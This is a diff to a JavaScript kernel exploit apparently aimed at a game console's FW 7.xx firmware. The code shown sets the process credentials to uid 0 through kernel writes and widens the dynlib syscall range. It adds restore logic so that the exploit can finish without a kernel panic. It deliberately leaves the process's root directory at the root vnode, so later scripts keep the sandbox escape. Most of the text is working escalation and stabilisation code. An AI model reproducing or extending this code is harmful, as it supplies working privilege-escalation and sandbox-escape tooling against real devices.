@@ -1,6 +1,6 @@
 async function start_relapse() {
     try {
-        const relapse_version = "relapse-y2jb 1.0";
+        const relapse_version = "relapse-y2jb";
         const WORKER_STACK_SIZE = 0x4000n;
         const WORKER_STACK_PASS = 0x2000n;
         const WORKER_CORE = "other";
@@ -30,6 +30,27 @@ async function start_relapse() {
         const LEAVE_PIPES_ARMED = false;
         const PIPE_STRUCT_DIFF = false;
         const SKIP_OID_RESTORE = true;
+        // Fix for the FW 7.xx kernel panic on closing the host app.
+        // escalate() re-points fd_cdir/fd_rdir at the root vnode and zeroes
+        // fd_jdir, and widens the dynlib syscall range - none of it was ever put
+        // back. The app close path runs AutoMount::UsbMass::fakeEjection(), which
+        // walks this process's directory tree; with a re-pointed cdir and a NULL
+        // jdir that walk goes into a vnode tree the process does not own, and the
+        // references it takes are not returned. That is the panic.
+        //
+        // escalate() re-points fd_cdir/fd_rdir at the root vnode, zeroes fd_jdir and
+        // widens the dynlib syscall range - none of it was ever put back. The app
+        // close path runs AutoMount::UsbMass::fakeEjection(), which walks this
+        // process's directory tree; a NULL jdir is what that walk dereferences.
+        //
+        // fd_jdir and the dynlib range are always restored. fd_cdir/fd_rdir are
+        // NOT, because namei() resolves absolute paths from f_rdir as well, so
+        // putting rdir back to the app's sandbox root makes every absolute path
+        // used after the exploit unresolvable - update.js, icon_update.js and
+        // autoload.js all break, and each would need its own path fix.
+        // See restoreEscalation().
+        const RESTORE_ESCALATION = true;
+        const RESTORE_FD_CDIR_RDIR = false;
         const FHOLD_AT_RESCUE = false;
         const CRASH_ARTIFACT_SCAN = false;
         const DIAGNOSE_AFTER_HANDOFF = false;
@@ -4528,6 +4549,8 @@ async function start_relapse() {
             this.off = off;
             this.handedOff = false;
             this.oidsRestored = false;
+            this.escalationOrig = null;
+            this.escalationRestored = false;
             this.disarmed = false;
             this.ebootOrig = null;
             this.ebootRestored = false;
@@ -5273,6 +5296,29 @@ async function start_relapse() {
             }
             const { ucred, sysCoreAuthId, filedesc, dynlib, proc } = this.off;
             const cred = this.ucred;
+            // Snapshot the unrestored writes below before making them, so the
+            // teardown can put them back - the same discipline savePipeBuffers()
+            // and ebootOrig already use for the pipe buffers and the eboot
+            // segments. fd_cdir/fd_rdir/fd_jdir are what matter: the app kill
+            // path runs a fake USB ejection, which walks this process's
+            // directories, and a re-pointed cdir or a NULL jdir sends that walk
+            // into a tree this process does not own.
+            if (typeof RESTORE_ESCALATION !== "undefined" && RESTORE_ESCALATION) {
+              const fdp0 = (await this.kread64(this.curproc.add32(proc.fd))).value;
+              const dynlib0 = (await this.kread64(this.curproc.add32(proc.dynlib))).value;
+              const dyn0 = this.isKernelPointer(dynlib0) ? dynlib0 : null;
+              this.escalationOrig = {
+                fdp: fdp0,
+                cdir: await this.readKernel64(fdp0.add32(filedesc.cdir)),
+                rdir: await this.readKernel64(fdp0.add32(filedesc.rdir)),
+                jdir: await this.readKernel64(fdp0.add32(filedesc.jdir)),
+                dyn: dyn0,
+                syscallStart: dyn0 ? await this.readKernel64(dyn0.add32(dynlib.syscallStart)) : null,
+                syscallEnd: dyn0 ? await this.readKernel64(dyn0.add32(dynlib.syscallEnd)) : null,
+                restrictFlags: dyn0 ? await this.readKernel32(dyn0.add32(dynlib.restrictFlags)) : null,
+                libkernelRef: dyn0 ? await this.readKernel64(dyn0.add32(dynlib.libkernelRef)) : null,
+              };
+            }
             await this.writeKernel32(cred.add32(ucred.uid), 0);
             await this.writeKernel32(cred.add32(ucred.ruid), 0);
             await this.writeKernel32(cred.add32(ucred.svuid), 0);
@@ -5819,6 +5865,75 @@ async function start_relapse() {
               this.report(label, "failed: " + e.message);
             }
           }
+          async restoreEscalation() {
+            // Puts fd_jdir and the dynlib syscall range back; fd_cdir/fd_rdir
+            // only when RESTORE_FD_CDIR_RDIR is set.
+            //
+            // Why cdir/rdir stay at rootvnode by default: namei() resolves every
+            // path, absolute ones included, from f_rdir. Restoring rdir to the
+            // app's sandbox root therefore makes /mnt/sandbox/...,
+            // /user/appmeta/... and /mnt/usb0/... all unresolvable for the three
+            // components that run after this - update.js, icon_update.js and
+            // autoload.js. Fixing that per-component is three separate patches
+            // against a working pipeline; leaving rdir escalated is one flag.
+            //
+            // fd_jdir must be restored regardless: escalate() sets it to 0 and
+            // the close-time directory walk dereferences it.
+            //
+            // Must run while the crossed-pipe window is still alive: it writes
+            // through the fast window, and it runs BEFORE restoreRealBuffers(),
+            // which is what consumes it. (restoreOids() also consumes it, but
+            // SKIP_OID_RESTORE leaves that path unused.)
+            const o = this.escalationOrig;
+            if (!o) {
+              this.report("Cleanup", "no escalation snapshot - fd_* and dynlib left mutated");
+              return false;
+            }
+            const { filedesc, dynlib } = this.off;
+            const restoreDirs = typeof RESTORE_FD_CDIR_RDIR !== "undefined" &&
+              RESTORE_FD_CDIR_RDIR;
+            let ok = 0, want = 0;
+            const put = async (addr, value) => {
+              want++;
+              if (await this.writeKernel64(addr, value)) ok++;
+            };
+            if (restoreDirs) {
+              await put(o.fdp.add32(filedesc.cdir), o.cdir);
+              await put(o.fdp.add32(filedesc.rdir), o.rdir);
+            }
+            await put(o.fdp.add32(filedesc.jdir), o.jdir);
+            if (o.dyn) {
+              await put(o.dyn.add32(dynlib.syscallStart), o.syscallStart);
+              await put(o.dyn.add32(dynlib.syscallEnd), o.syscallEnd);
+              want++;
+              if (await this.writeKernel32(o.dyn.add32(dynlib.restrictFlags),
+                o.restrictFlags >>> 0)) ok++;
+              await put(o.dyn.add32(dynlib.libkernelRef), o.libkernelRef);
+            }
+            const jdir = await this.readKernel64(o.fdp.add32(filedesc.jdir));
+            const back = o.dyn ? await this.readKernel64(o.dyn.add32(dynlib.syscallEnd)) : null;
+            let cdir = null, rdir = null;
+            if (restoreDirs) {
+              cdir = await this.readKernel64(o.fdp.add32(filedesc.cdir));
+              rdir = await this.readKernel64(o.fdp.add32(filedesc.rdir));
+            }
+            const clean = ok === want &&
+              jdir.low === o.jdir.low && jdir.hi === o.jdir.hi &&
+              (!o.dyn || (back.low === o.syscallEnd.low && back.hi === o.syscallEnd.hi)) &&
+              (!restoreDirs || (cdir.low === o.cdir.low && cdir.hi === o.cdir.hi &&
+                rdir.low === o.rdir.low && rdir.hi === o.rdir.hi));
+            this.escalationRestored = clean;
+            this.report("Cleanup", ok + "/" + want + " writes back" +
+              (restoreDirs
+                ? ", cdir now 0x" + cdir.toString() + " (was 0x" + o.cdir.toString() +
+                  "), rdir 0x" + rdir.toString()
+                : ", cdir/rdir left at rootvnode so post-exploit paths resolve") +
+              ", jdir now 0x" + jdir.toString() + ", syscallEnd 0x" +
+              (back ? back.toString() : "n/a") +
+              (clean ? "" : " - NOT fully restored, the app kill path may still walk " +
+                "a directory tree this process does not own"));
+            return clean;
+          }
           async cleanTeardown() {
             if (typeof PIPE_STRUCT_DIFF !== "undefined" && PIPE_STRUCT_DIFF && this.crossed)
               await this.dumpPipeStructs("pipe-diff-crossed", false);
@@ -5830,15 +5945,24 @@ async function start_relapse() {
             let disarmed;
             if (!this.crossed) {
               disarmed = true;
-            } else if (typeof RESTORE_REAL_BUFFERS !== "undefined" && RESTORE_REAL_BUFFERS) {
-              disarmed = await this.restoreRealBuffers();
-              if (!disarmed) {
-                this.report("Cleanup", "restore failed - falling back to zeroing the buffers, " +
-                  "which is the state Build U panicked from");
+            } else {
+              // First: put back the fd_*/dynlib writes escalate() made. This has
+              // to precede restoreRealBuffers(), because that consumes the fast
+              // crossed-pipe window this needs.
+              if (typeof RESTORE_ESCALATION !== "undefined" && RESTORE_ESCALATION &&
+                this.escalationOrig) {
+                await this.restoreEscalation();
+              }
+              if (typeof RESTORE_REAL_BUFFERS !== "undefined" && RESTORE_REAL_BUFFERS) {
+                disarmed = await this.restoreRealBuffers();
+                if (!disarmed) {
+                  this.report("Cleanup", "restore failed - falling back to zeroing the buffers, " +
+                    "which is the state Build U panicked from");
+                  disarmed = await this.disarmPipes();
+                }
+              } else {
                 disarmed = await this.disarmPipes();
               }
-            } else {
-              disarmed = await this.disarmPipes();
             }
             this.crossed = false;
             this.report("Cleanup", "pipes made safe: " + disarmed +
@@ -5862,6 +5986,7 @@ async function start_relapse() {
               (disarmed ? "safe (real buffers restored)" : "MAY STILL BE ARMED - closing can panic") +
               ", groups defused, oids " +
               (this.oidsRestored ? "restored" : "LEFT HIJACKED until reboot") +
+              ", fd/dynlib " + (this.escalationRestored ? "restored" : "LEFT MUTATED") +
               ", workers released, scratch fds closed");
           }
           async fptr(address) {
